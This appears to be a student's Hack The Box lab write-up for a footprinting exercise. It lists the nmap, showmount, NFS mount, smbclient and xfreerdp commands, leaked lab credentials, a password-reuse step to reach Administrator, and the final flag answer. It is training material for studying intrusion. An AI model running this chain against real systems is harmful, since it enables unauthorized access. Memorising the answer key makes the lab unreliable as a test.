# LAB — Footprinting (Medium)

## ID
603

## Module
Footprinting

## Kind
lab

## Title
Section 20 — Footprinting Lab · Medium

## Description
Windows host with NFS + SMB + RDP + MSSQL. Pull a chat-log file from anonymous NFS share `TechSupport` → leaks `alex:lol123!mD` → SMB share `devshare` → `important.txt` leaks `sa:87N1ns@slls83` (password reuse → Administrator) → RDP in → SSMS → query `devsacc` table for `HTB` user's password.

## Tags
htb, lab, footprinting, nfs, smb, rdp, mssql, ssms, password-reuse, windows, medium

## Commands
- `sudo nmap -A <IP>`
- `showmount -e <IP>`
- `sudo mkdir NFS && sudo mount -t nfs <IP>:/TechSupport ./NFS`
- `sudo ls -lA NFS/` — find non-empty file
- `sudo cat NFS/ticket4238791283782.txt` — leaks creds for `alex`
- `smbclient -L //<IP> -U alex` — list shares
- `smbclient //<IP>/devshare -U alex` → `get important.txt`
- `awk 1 important.txt` (or `cat`) — reveals `sa:87N1ns@slls83`
- `xfreerdp /v:<IP> /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution`
- Inside RDP: open SQL Server Management Studio 18 → connect → `SELECT * FROM devsacc WHERE name='HTB'`

## Scenario Recap
- Server everyone on the internal network can reach.
- Verify and find the password for user `HTB`.

## Walkthrough — Step by Step

### 1. Initial Nmap
`sudo nmap -A <IP>` reveals NFS (TCP/111, 2049), SMB (TCP/139, 445), RDP (TCP/3389), msrpc (TCP/135) — Windows host.

### 2. Enumerate NFS — `TechSupport` share is open to everyone
```bash
showmount -e <IP>
# Export list: /TechSupport (everyone)

sudo mkdir NFS && sudo mount -t nfs <IP>:/TechSupport ./NFS
sudo ls -lA NFS/
```
Hundreds of empty `ticketXXXXXXX.txt` files — **only `ticket4238791283782.txt` has non-zero size (1305 bytes)**.

### 3. Read the Single Non-Empty Ticket
```bash
sudo cat NFS/ticket4238791283782.txt
```
Chat log — user `alex` shared his SMTP config in plaintext:
```
host=smtp.web.dev.inlanefreight.htb
user="alex"
password="lol123!mD"
```

### 4. SMB as `alex`
```bash
smbclient -L //<IP> -U alex
# password: lol123!mD
# Shares: ADMIN$, C$, devshare, IPC$, Users
```

### 5. Pull `important.txt` from `devshare`
```bash
smbclient //<IP>/devshare -U alex
smb: \> get important.txt
smb: \> exit
awk 1 important.txt
# sa:87N1ns@slls83
```
The file says `sa:...` — looks like a SQL `sa` account, but **test password reuse** against the local Administrator first.

### 6. Test Password Reuse → RDP as Administrator
```bash
xfreerdp /v:<IP> /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
```
**Login succeeds.** The `sa` label in the file was a hint that the *same password* was reused.

### 7. Inside RDP — Open SSMS
- Launch **SQL Server Management Studio 18**.
- Connect to local instance (Windows Auth — you're already Administrator).
- Find the table `devsacc` (likely under a user-data DB).

### 8. Query for User `HTB`
```sql
SELECT * FROM devsacc WHERE name='HTB'
```
Returns:
```
name: HTB
password: lnch7ehrdn43i7AoqVPK4zWR
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Password for user `HTB` | **`lnch7ehrdn43i7AoqVPK4zWR`** | NFS chat-log → `alex:lol123!mD` → SMB `devshare/important.txt` → `sa:87N1ns@slls83` → password reuse → RDP as Administrator → SSMS → `SELECT * FROM devsacc WHERE name='HTB'` |

## Key Takeaways
- **`ls -lA` always** — empty/zero-byte files are noise; a single non-empty file in a sea of decoys is the signal.
- **Password reuse is the connecting tissue** — a `sa:<pw>` line in a "config" file is also a hint to try `<pw>` against `Administrator`, `root`, every other admin account.
- A chat log on a public share is a goldmine — devs paste configs/secrets into tickets all the time.
- SSMS on the server (or any Windows admin host) gives you the database with zero password prompts when you're already logged in as Administrator (Windows Auth).

## Gotchas
- The `TechSupport` share has hundreds of empty decoy files — `ls -lA` and **sort by size** or grep for non-zero bytes to find the real ticket fast.
- The plaintext credential in the chat is named `alex` (SMTP user) but the password works for SMB too — same identity, different protocol.
- `xfreerdp /dynamic-resolution` matches your Pwnbox window size on the fly — useful for SSMS GUI work.
- The `important.txt` line `sa:87N1ns@slls83` looks like it should be tried against MSSQL on TCP/1433 first, but the lab gates the answer behind RDP+SSMS — **always test the password against multiple services**.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|footprinting]]
← [[19-lab-easy]] | [[21-lab-hard]] →
<!-- AUTO-LINKS-END -->
